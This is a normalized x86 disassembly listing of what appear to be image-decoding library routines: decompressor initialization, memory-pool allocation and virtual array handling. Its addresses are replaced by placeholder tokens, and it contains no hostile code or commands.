inc [ ebp - 0x14 ]
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
add eax 0x4
call sub_459688
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_459658
mov [ ebp - 0x20 ] 0x20
mov edx rw-data
lea eax [ ebp - 0xc ]
call sub_4595e4
inc [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_459688
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_459658
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
cld
imul ebp [ esi + 0x67 ] 0x90002a20
nop
nop
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
setne al
and eax 0x1
push eax
push [ rw-data ]
cmp [ rw-data ] 0x0
setne dl
and edx 0x1
push edx
cmp [ rw-data ] 0x0
setne cl
and ecx 0x1
push ecx
call sub_4011bc
add esp 0x10
pop ebp
retn
sub_45977c
push ebp
mov ebp esp
add esp 0xffffffd0
mov eax rw-data
call sub_44f3b0
mov [ ebp - 0x20 ] 0x8
mov edx rw-data
lea eax [ ebp - 0x4 ]
call sub_4595e4
inc [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_459688
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_459658
mov [ ebp - 0x20 ] 0x14
mov edx rw-data
lea eax [ ebp - 0x8 ]
call sub_4595e4
inc [ ebp - 0x14 ]
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
add eax 0x4
call sub_459688
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_459658
mov [ ebp - 0x20 ] 0x20
mov edx rw-data
lea eax [ ebp - 0xc ]
call sub_4595e4
inc [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_459688
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_459658
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
sub_4598ec
push ebx
mov ebx eax
xor eax eax
push esi
mov esi ecx
mov [ ebx + 0x4 ] eax
cmp edx 0x3d
je r-xdata
cmp esi 0x1c2
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0xa
mov [ eax + 0x18 ] 0x3d
mov [ eax + 0x1c ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi [ ebx ]
push 0x1c2
push 0x0
push ebx
call sub_46a318
add esp 0xc
mov [ ebx ] esi
mov [ ebx + 0xc ] 0x1
mov eax ebx
call sub_45a950
xor edx edx
mov [ ebx + 0x8 ] edx
xor ecx ecx
mov [ ebx + 0x14 ] ecx
push 0x10
push 0x0
lea eax [ ebx + 0xa0 ]
push eax
call sub_46a318
add esp 0xc
lea edx [ ebx + 0xb0 ]
push 0x10
push 0x0
push edx
call sub_46a318
add esp 0xc
lea ecx [ ebx + 0xc0 ]
push 0x10
push 0x0
push ecx
call sub_46a318
add esp 0xc
mov eax ebx
call sub_46440c
mov eax ebx
call sub_45afa0
mov [ ebx + 0x10 ] 0xc8
pop esi
pop ebx
retn
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x13
mov [ eax + 0x18 ] 0x1c2
mov [ eax + 0x1c ] esi
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_4599c4
cmp edx 0xfe
jne r-xdata
cmp edx 0xe0
jl r-xdata
mov eax [ eax + 0x1aa ]
mov [ eax + 0xc ] ecx
retn
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x43
mov [ ecx + 0x18 ] edx
mov edx [ eax ]
call [ edx ]
retn
cmp edx 0xef
jg r-xdata
mov eax [ eax + 0x1aa ]
mov [ eax + edx * 4 - 0x370 ] ecx
retn
sub_459a08
push ebx
mov ebx eax
push esi
mov eax [ ebx + 0x20 ]
dec eax
je r-xdata
mov [ ebx + 0x24 ] 0x1
mov [ ebx + 0x28 ] 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0x2c ] 0x1
mov [ ebx + 0x30 ] 0x1
xor ecx ecx
xor eax eax
mov [ ebx + 0x34 ] ecx
xor edx edx
mov [ ebx + 0x38 ] 0x3ff00000
mov [ ebx + 0x3c ] eax
mov [ ebx + 0x40 ] edx
xor ecx ecx
xor eax eax
mov [ ebx + 0x44 ] ecx
xor edx edx
mov [ ebx + 0x48 ] 0x1
mov [ ebx + 0x4c ] 0x1
mov [ ebx + 0x50 ] eax
xor ecx ecx
mov [ ebx + 0x54 ] 0x2
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x5c ] 0x100
mov [ ebx + 0x84 ] edx
xor eax eax
mov [ ebx + 0x60 ] ecx
mov [ ebx + 0x64 ] eax
xor edx edx
mov [ ebx + 0x68 ] edx
pop esi
pop ebx
retn
cmp [ ebx + 0x114 ] 0x0
je r-xdata
dec eax
je r-xdata
cmp [ ebx + 0x11d ] 0x0
je r-xdata
mov [ ebx + 0x24 ] 0x3
jmp r-xdata
cmp [ ebx + 0x11d ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ ebx + 0xd4 ]
mov eax [ ecx ]
mov edx [ ecx + 0x54 ]
mov ecx [ ecx + 0xa8 ]
cmp eax 0x1
jne r-xdata
mov dl [ ebx + 0x121 ]
sub dl 0x1
jb r-xdata
mov [ ebx + 0x28 ] 0x2
jmp r-xdata
mov [ ebx + 0x24 ] 0x4
mov dl [ ebx + 0x121 ]
sub dl 0x1
jb r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x28 ] edx
cmp eax 0x52
jne r-xdata
cmp edx 0x2
jne r-xdata
mov [ ebx + 0x24 ] 0x2
jmp r-xdata
je r-xdata
mov [ ebx + 0x24 ] 0x4
jmp r-xdata
dec dl
je r-xdata
mov esi [ ebx ]
add esi 0x18
mov [ esi ] eax
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] ecx
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x6b
mov edx 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov [ ebx + 0x24 ] 0x3
cmp edx 0x47
jne r-xdata
cmp ecx 0x3
jne r-xdata
mov [ ebx + 0x24 ] 0x3
jmp r-xdata
jmp r-xdata
mov [ ebx + 0x28 ] 0x4
jmp r-xdata
mov [ ebx + 0x24 ] 0x5
jmp r-xdata
jmp r-xdata
cmp ecx 0x42
jne r-xdata
mov [ ebx + 0x24 ] 0x3
jmp r-xdata
mov eax [ ebx ]
xor edx edx
mov [ eax + 0x14 ] 0x6e
mov dl [ ebx + 0x121 ]
mov [ eax + 0x18 ] edx
mov eax ebx
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov [ ebx + 0x24 ] 0x3
jmp r-xdata
mov eax [ ebx ]
xor edx edx
mov [ eax + 0x14 ] 0x6e
mov dl [ ebx + 0x121 ]
mov [ eax + 0x18 ] edx
mov eax ebx
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov [ ebx + 0x24 ] 0x5
jmp r-xdata
mov [ ebx + 0x24 ] 0x2
jmp r-xdata
sub_459bf0
push ebx
mov ebx eax
push esi
mov esi edx
mov eax [ ebx + 0x10 ]
cmp eax 0xc8
je r-xdata
mov eax ebx
call sub_459c5c
mov edx eax
sub edx 0x1
jb r-xdata
cmp eax 0xc9
je r-xdata
pop esi
pop ebx
retn
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x12
mov edx [ ebx + 0x10 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax 0x1
jmp r-xdata
dec edx
je r-xdata
test esi esi
je r-xdata
jmp r-xdata
mov eax ebx
call sub_4644ec
mov eax 0x2
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x32
mov edx [ eax ]
call [ edx ]
sub_459c5c
push ebx
mov ebx eax
push esi
xor esi esi
mov eax [ ebx + 0x10 ]
add eax 0xffffff38
cmp eax 0xa
ja r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x12
mov edx [ ebx + 0x10 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov al [ eax + lookup_table_459c7c ]
jmp [ eax * 4 + jump_table_459c87 ]
mov eax ebx
mov edx [ eax + 0x1a6 ]
call [ edx + 0x4 ]
mov eax ebx
mov edx [ eax + 0x14 ]
call [ edx + 0x8 ]
mov [ ebx + 0x10 ] 0xc9
mov eax ebx
mov edx [ eax + 0x1a6 ]
call [ edx ]
mov esi eax
cmp esi 0x1
jne r-xdata
mov esi 0x1
jmp r-xdata
mov eax ebx
mov edx [ eax + 0x1a6 ]
call [ edx ]
mov esi eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_459a08
mov [ ebx + 0x10 ] 0xca
jmp r-xdata
sub_459d08
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp eax 0xc8
jl r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x12
mov edx [ ebx + 0x10 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp eax 0xd2
jle r-xdata
mov ecx [ ebx + 0x1a6 ]
mov eax [ ecx + 0x14 ]
pop ebx
retn
sub_459d3c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp eax 0xca
jl r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x12
mov edx [ ebx + 0x10 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp eax 0xd2
jle r-xdata
mov ecx [ ebx + 0x1a6 ]
mov eax [ ecx + 0x10 ]
pop ebx
retn
sub_459d70
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp eax 0xcd
je r-xdata
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
cmp eax 0xce
jne r-xdata
cmp [ ebx + 0x10 ] 0xcf
jne r-xdata
mov edx [ ebx + 0x88 ]
cmp edx [ ebx + 0x70 ]
jae r-xdata
cmp [ ebx + 0x10 ] 0xd2
je r-xdata
mov [ ebx + 0x10 ] 0xd2
jmp r-xdata
mov eax ebx
mov edx [ eax + 0x196 ]
call [ edx + 0x4 ]
mov [ ebx + 0x10 ] 0xd2
jmp r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x42
mov edx [ eax ]
call [ edx ]
mov edx [ ebx + 0x1a6 ]
cmp [ edx + 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x12
mov edx [ ebx + 0x10 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
jmp r-xdata
mov eax ebx
mov edx [ eax + 0x1a6 ]
call [ edx ]
test eax eax
jne r-xdata
mov eax ebx
mov edx [ eax + 0x14 ]
call [ edx + 0x18 ]
mov eax ebx
call sub_4644ec
mov eax 0x1
pop ebx
retn
xor eax eax
pop ebx
retn
sub_459e34
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi eax
mov esi ecx
cmp esi 0x3b9ac9f4
mov [ esp ] edx
mov eax [ edi + 0x4 ]
mov [ esp + 0x4 ] eax
jbe r-xdata
mov eax esi
and eax 0x7
test eax eax
jbe r-xdata
mov edx 0x1
mov eax edi
call sub_459e20
cmp [ esp ] 0x0
jl r-xdata
mov edx 0x8
sub edx eax
add esi edx
mov eax [ edi ]
mov [ eax + 0x14 ] 0xc
mov edx [ esp ]
mov [ eax + 0x18 ] edx
mov eax edi
mov edx [ eax ]
call [ edx ]
cmp [ esp ] 0x2
jl r-xdata
test eax eax
jne r-xdata
cmp esi [ eax + 0x8 ]
jbe r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp ]
xor ebp ebp
mov eax [ eax + edx * 4 + 0x30 ]
test eax eax
je r-xdata
lea edx [ eax + 0xc ]
add edx [ eax + 0x4 ]
add [ eax + 0x4 ] esi
sub [ eax + 0x8 ] esi
mov eax edx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ esi + 0xc ]
test ebp ebp
mov [ esp + 0x8 ] eax
jne r-xdata
mov ebp eax
mov eax [ eax ]
test eax eax
jne r-xdata
mov eax [ esp ]
mov ebx [ eax * 4 + rw-data ]
mov edx [ esp ]
mov ebx [ edx * 4 + rw-data ]
jmp r-xdata
mov edx [ esp + 0x8 ]
mov eax edi
add edx ebx
call sub_45aa3c
test eax eax
jne r-xdata
mov ebx eax
mov eax 0x3b9aca00
sub eax [ esp + 0x8 ]
cmp ebx eax
jbe r-xdata
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
add ecx ebx
add ebx esi
add ecx [ edx + 0x48 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x48 ] ecx
xor ecx ecx
xor edx edx
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
test ebp ebp
jne r-xdata
mov ecx 0x2
mov eax ebx
xor edx edx
div ecx
mov ebx eax
cmp ebx 0x32
jae r-xdata
mov [ ebp ] eax
mov edx [ esp + 0x4 ]
mov ecx [ esp ]
mov [ edx + ecx * 4 + 0x30 ] eax
jmp r-xdata
mov edx 0x2
mov eax edi
call sub_459e20
jmp r-xdata
sub_459f64
push ebx
push esi
push edi
push ebp
mov ebp eax
push ecx
mov [ esp ] edx
mov esi ecx
cmp esi 0x3b9ac9f4
mov edi [ ebp + 0x4 ]
jbe r-xdata
mov eax esi
and eax 0x7
test eax eax
jbe r-xdata
mov edx 0x3
mov eax ebp
call sub_459e20
cmp [ esp ] 0x0
jl r-xdata
mov edx 0x8
sub edx eax
add esi edx
mov eax [ ebp ]
mov [ eax + 0x14 ] 0xc
mov edx [ esp ]
mov [ eax + 0x18 ] edx
mov eax ebp
mov edx [ eax ]
call [ edx ]
cmp [ esp ] 0x2
jl r-xdata
mov ecx [ edi + 0x48 ]
add ecx esi
add ecx 0xc
mov [ edi + 0x48 ] ecx
xor ecx ecx
mov eax [ esp ]
mov edx [ edi + eax * 4 + 0x38 ]
mov [ ebx ] edx
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] ecx
mov eax [ esp ]
mov [ edi + eax * 4 + 0x38 ] ebx
lea eax [ ebx + 0xc ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx 0x4
mov eax ebp
call sub_459e20
lea edx [ esi + 0xc ]
mov eax ebp
call sub_45aa4c
mov ebx eax
test ebx ebx
jne r-xdata
sub_45a004
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov eax 0x3b9ac9f4
div [ ebp - 0xc ]
mov ebx eax
test ebx ebx
jg r-xdata
cmp ebx [ ebp + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x45
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
sub eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x14 ]
jbe r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi + 0x4c ] eax
mov ecx [ ebp + 0x8 ]
shl ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_459e34
mov [ ebp - 0x10 ] eax
xor edx edx
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
jmp r-xdata
mov edx [ ebp - 0x18 ]
cmp edx [ ebp + 0x8 ]
jb r-xdata
mov [ eax ] edx
inc [ ebp - 0x18 ]
add eax 0x4
add edx [ ebp - 0xc ]
dec ecx
test ecx ecx
ja r-xdata
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
imul ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_459f64
mov edx eax
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
mov ebx [ ebp - 0x18 ]
lea eax [ eax + ebx * 4 ]
test ecx ecx
jbe r-xdata
sub_45a0d8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov eax [ ebp - 0xc ]
shl eax 0x7
push eax
mov eax 0x3b9ac9f4
pop edx
mov ecx edx
xor edx edx
div ecx
mov ebx eax
test ebx ebx
jg r-xdata
cmp ebx [ ebp + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x45
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
sub eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x14 ]
jbe r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi + 0x4c ] eax
mov ecx [ ebp + 0x8 ]
shl ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_459e34
mov [ ebp - 0x10 ] eax
xor edx edx
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp + 0x8 ]
jb r-xdata
mov [ eax ] edx
inc [ ebp - 0x18 ]
add eax 0x4
mov ebx [ ebp - 0xc ]
shl ebx 0x7
add edx ebx
dec ecx
test ecx ecx
ja r-xdata
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0xc ]
shl ecx 0x7
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_459f64
mov edx eax
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
mov ebx [ ebp - 0x18 ]
lea eax [ eax + ebx * 4 ]
test ecx ecx
jbe r-xdata
sub_45a1bc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] ecx
cmp edi 0x1
mov esi [ ebx + 0x4 ]
je r-xdata
mov ecx 0x80
mov edx edi
mov eax ebx
call sub_459e34
xor ecx ecx
mov [ eax ] ecx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov [ eax + 0xc ] edx
xor edx edx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x20 ] ecx
mov [ eax + 0x28 ] edx
mov ecx [ esi + 0x40 ]
mov [ eax + 0x2c ] ecx
mov [ esi + 0x40 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
mov eax [ ebx ]
mov [ eax + 0x14 ] 0xc
mov [ eax + 0x18 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_45a224
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] ecx
cmp edi 0x1
mov esi [ ebx + 0x4 ]
je r-xdata
mov ecx 0x80
mov edx edi
mov eax ebx
call sub_459e34
xor ecx ecx
mov [ eax ] ecx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov [ eax + 0xc ] edx
xor edx edx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x20 ] ecx
mov [ eax + 0x28 ] edx
mov ecx [ esi + 0x44 ]
mov [ eax + 0x2c ] ecx
mov [ esi + 0x44 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
mov eax [ ebx ]
mov [ eax + 0x14 ] 0xc
mov [ eax + 0x18 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_45a28c
push ebx
push esi
push edi
mov edi eax
push ebp
push ecx
mov ebp [ edi + 0x4 ]
xor eax eax
mov [ esp ] eax
xor esi esi
mov ebx [ ebp + 0x40 ]
test ebx ebx
je r-xdata
mov ebx [ ebp + 0x44 ]
test ebx ebx
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
test esi esi
jle r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov ebx [ ebx + 0x2c ]
test ebx ebx
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ ebx + 0xc ]
imul edx eax
mov ecx [ ebx + 0x4 ]
add edx esi
imul ecx eax
add ecx [ esp ]
mov esi edx
mov [ esp ] ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x48 ]
mov edx esi
push eax
mov eax edi
mov ecx [ esp + 0x4 ]
call sub_45aa5c
mov ecx eax
cmp ecx [ esp ]
jl r-xdata
mov ebx [ ebx + 0x2c ]
test ebx ebx
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ ebx + 0xc ]
imul edx eax
mov ecx [ ebx + 0x4 ]
imul ecx eax
shl edx 0x7
shl ecx 0x7
add edx esi
add ecx [ esp ]
mov esi edx
mov [ esp ] ecx
mov eax ecx
cdq
idiv esi
mov esi eax
test esi esi
jg r-xdata
mov esi 0x3b9aca00
jmp r-xdata
mov ebx [ ebp + 0x40 ]
test ebx ebx
je r-xdata
mov esi 0x1
mov ebx [ ebp + 0x44 ]
test ebx ebx
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov ebx [ ebx + 0x2c ]
test ebx ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov eax ecx
dec eax
xor edx edx
div [ ebx + 0xc ]
inc eax
cmp esi eax
jl r-xdata
mov ebx [ ebx + 0x2c ]
test ebx ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov eax ecx
dec eax
xor edx edx
div [ ebx + 0xc ]
inc eax
cmp esi eax
jl r-xdata
mov eax esi
imul [ ebx + 0xc ]
mov [ ebx + 0x10 ] eax
mov eax edi
mov ecx [ ebx + 0x4 ]
lea edx [ ebx + 0x30 ]
imul ecx [ ebx + 0x8 ]
call sub_45aa68
mov [ ebx + 0x28 ] 0x1
mov [ ebx + 0x10 ] ecx
jmp r-xdata
mov eax esi
imul [ ebx + 0xc ]
mov [ ebx + 0x10 ] eax
mov eax edi
mov ecx [ ebx + 0x4 ]
lea edx [ ebx + 0x30 ]
imul ecx [ ebx + 0x8 ]
shl ecx 0x7
call sub_45aa68
mov [ ebx + 0x28 ] 0x1
mov [ ebx + 0x10 ] ecx
jmp r-xdata
mov edx [ ebx + 0x10 ]
mov eax edi
push edx
mov edx 0x1
mov ecx [ ebx + 0x8 ]
call sub_45a004
mov [ ebx ] eax
xor eax eax
mov ecx [ ebp + 0x4c ]
xor edx edx
mov [ ebx + 0x14 ] ecx
mov [ ebx + 0x18 ] eax
mov [ ebx + 0x1c ] edx
xor ecx ecx
mov [ ebx + 0x24 ] ecx
mov edx [ ebx + 0x10 ]
mov eax edi
push edx
mov edx 0x1
mov ecx [ ebx + 0x8 ]
call sub_45a0d8
mov [ ebx ] eax
xor eax eax
mov ecx [ ebp + 0x4c ]
xor edx edx
mov [ ebx + 0x14 ] ecx
mov [ ebx + 0x18 ] eax
mov [ ebx + 0x1c ] edx
xor ecx ecx
mov [ ebx + 0x24 ] ecx
sub_45a420
push ebx
push esi
push edi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov ebx edx
mov [ esp ] eax
mov eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
mov edx [ ebx + 0x18 ]
imul edx [ esp + 0x8 ]
mov [ esp + 0xc ] edx
xor esi esi
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp esi eax
jl r-xdata
sub eax esi
cmp eax [ ebx + 0x14 ]
jle r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
sub eax esi
mov eax [ ebx + 0x14 ]
jmp r-xdata
mov ecx [ ebx + 0x4 ]
sub ecx edx
cmp eax ecx
jl r-xdata
mov eax [ ebx + 0x1c ]
sub eax edx
mov edx [ ebx + 0x18 ]
add edx esi
mov ecx [ ebx + 0x1c ]
sub ecx edx
cmp eax ecx
jl r-xdata
test eax eax
jle r-xdata
mov eax [ ebx + 0x4 ]
sub eax edx
mov edi eax
imul edi [ esp + 0x8 ]
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov ecx [ esp + 0xc ]
lea edx [ ebx + 0x30 ]
push ecx
push edi
mov eax [ ebx ]
mov ecx [ eax + esi * 4 ]
mov eax [ esp + 0x8 ]
call [ ebx + 0x30 ]
mov eax [ esp + 0xc ]
push eax
push edi
mov edx [ ebx ]
mov eax [ esp + 0x8 ]
mov ecx [ edx + esi * 4 ]
lea edx [ ebx + 0x30 ]
call [ ebx + 0x34 ]
jmp r-xdata
add [ esp + 0xc ] edi
add esi [ ebx + 0x14 ]
sub_45a4cc
push ebx
push esi
push edi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov ebx edx
mov [ esp ] eax
mov eax [ ebx + 0x8 ]
shl eax 0x7
mov [ esp + 0x8 ] eax
mov edx [ ebx + 0x18 ]
imul edx [ esp + 0x8 ]
mov [ esp + 0xc ] edx
xor esi esi
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp esi eax
jl r-xdata
sub eax esi
cmp eax [ ebx + 0x14 ]
jle r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
sub eax esi
mov eax [ ebx + 0x14 ]
jmp r-xdata
mov ecx [ ebx + 0x4 ]
sub ecx edx
cmp eax ecx
jl r-xdata
mov eax [ ebx + 0x1c ]
sub eax edx
mov edx [ ebx + 0x18 ]
add edx esi
mov ecx [ ebx + 0x1c ]
sub ecx edx
cmp eax ecx
jl r-xdata
test eax eax
jle r-xdata
mov eax [ ebx + 0x4 ]
sub eax edx
mov edi eax
imul edi [ esp + 0x8 ]
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov ecx [ esp + 0xc ]
lea edx [ ebx + 0x30 ]
push ecx
push edi
mov eax [ ebx ]
mov ecx [ eax + esi * 4 ]
mov eax [ esp + 0x8 ]
call [ ebx + 0x30 ]
mov eax [ esp + 0xc ]
push eax
push edi
mov edx [ ebx ]
mov eax [ esp + 0x8 ]
mov ecx [ edx + esi * 4 ]
lea edx [ ebx + 0x30 ]
call [ ebx + 0x34 ]
jmp r-xdata
add [ esp + 0xc ] edi
add esi [ ebx + 0x14 ]
sub_45a57c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov edi [ ebp - 0x8 ]
add edi eax
cmp edi [ ebx + 0x4 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x14
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
cmp eax [ ebx + 0xc ]
ja r-xdata
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
add eax [ ebx + 0x10 ]
cmp edi eax
jbe r-xdata
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx + 0x24 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx ]
mov [ ecx + 0x14 ] 0x44
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x1c ]
cmp edi eax
jbe r-xdata
mov eax [ ebx + 0x18 ]
cmp eax [ ebp - 0x8 ]
ja r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x18 ]
jbe r-xdata
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45a420
xor ecx ecx
mov [ ebx + 0x24 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax edi
sub eax [ ebx + 0x10 ]
test eax eax
jge r-xdata
mov edx [ ebp - 0x8 ]
mov [ ebx + 0x18 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ ebx + 0x18 ]
shl eax 0x2
add eax [ ebx ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x24 ] 0x1
mov esi [ ebx + 0x1c ]
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x18 ] eax
xor eax eax
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
